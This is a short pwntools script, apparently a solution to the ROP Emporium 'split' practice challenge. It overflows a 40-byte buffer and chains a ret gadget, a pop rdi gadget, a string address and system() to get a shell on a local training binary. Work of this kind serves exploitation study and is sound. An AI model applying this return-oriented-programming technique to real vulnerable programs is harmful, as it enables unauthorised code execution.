from pwn import *

p = process('./split')
e = ELF('./split')

rop = ROP(e)
RET = rop.find_gadget(['ret'])[0]
POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]

p.recvuntil(b'> ')
offset = b'A' * 40
system = e.sym['system']
usefulStringAddr = 0x601060

# first the offset to the place on the stack where the return address is stored then a ret for stack alignment purposes
# then a pop rdi gadget to pass the first argument into the system function and then the address of the system function 

payload = offset + p64(RET) + p64(POP_RDI) + p64(usefulStringAddr) + p64(system)
p.sendline(payload)
p.interactive()
